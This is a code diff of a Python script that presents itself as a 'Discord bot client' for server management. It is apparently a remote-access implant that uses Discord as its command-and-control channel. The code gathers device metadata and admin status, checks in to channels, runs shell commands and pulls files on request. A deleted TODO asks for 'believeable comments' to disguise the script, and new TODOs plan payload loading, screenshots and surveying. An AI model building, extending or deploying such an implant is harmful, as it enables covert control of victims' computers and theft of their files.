@@ -1,7 +1,4 @@
 """
-TODO: generate random believeable comments for the script.
-"""
-"""
     Discord bot client v0.1 by INSERT_NAME
     Used for server management, logging, and utility functions.
     DO NOT REMOVE!
@@ -24,25 +21,18 @@ from discord.ext import commands
 DISCORD_TOKEN = Path("E:\\CompSci\\lenny_token.txt").read_text(encoding="utf-8")
 CHECKIN_CHANNELS = set()
 LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
-EXIT_CONFIRMED = False
 
 """
-TODO: for third-party modules, it should request them
-from the server, and drop the wheel to disk, and then import.
-"""
-
-"""
-TODO: need a download/put file function
-"""
-
-"""
-TODO: need to come up with a clever way to run the python
-maybe pipe to stdin or something similar
-"""
-
-"""
-TODO: need to change to use urllib or something that is in the standard
-library, or drop it to disk with requests
+TODO: Interesting stuff to add:
+- Support for larger message processing
+- Put file from server to client
+- With get files, have them go as attachments to the server
+- A way to load third-party python packages.
+  e.g. request from the server, and drop the wheel to disk, and then import.
+- Find a standard library way to bootstrap. Currently we require a few different 3p packages.
+- Screenshot capability?
+- Survey capability
+- Clean up the exit function
 """
 
 try:
@@ -135,11 +125,7 @@ def get_local_admin_status():
 
 def process_command(cmd_str):
     """
-        TODO: parse command. Options:
-        get -- get a file
-        exec -- run a command
-        -- if the cmd is cd {}, should do an os.setcwd()
-        exit -- terminate process
+        Parse command and pass to the appropriate function.
     """
     usage_string = "Invalid command. Usage:\nexec <cmd>\nget <file>\nexit"
 
@@ -152,9 +138,12 @@ def process_command(cmd_str):
 
     commands = {
         "exec": execute_command,
-        "get": get_content,
-        "exit": lambda _: exit
+        "get": get_content
     }
+
+    # This is a bit buggy at the moment, prints a stack trace when its done
+    if cmd == "exit":
+        do_exit()
 
     if cmd in commands:
         output = commands[cmd](arg)
@@ -216,7 +205,10 @@ def get_content(upload):
     except OSError as e:
         return e
 
-# Should run after Bot() object is created?
+def do_exit():
+    exit()
+
+# Runs after Bot() object is created
 @bot.event
 async def on_ready():
     metadata_pretty, metadata = get_device_metadata()
@@ -241,6 +233,7 @@ async def on_ready():
             await existing.send("📡 Device has checked in again!")
             await existing.send(metadata_pretty)
 
+# Runs when a message is seen in any of its channels
 @bot.event
 async def on_message(message):
     # Ignore other bots (including ourselves)
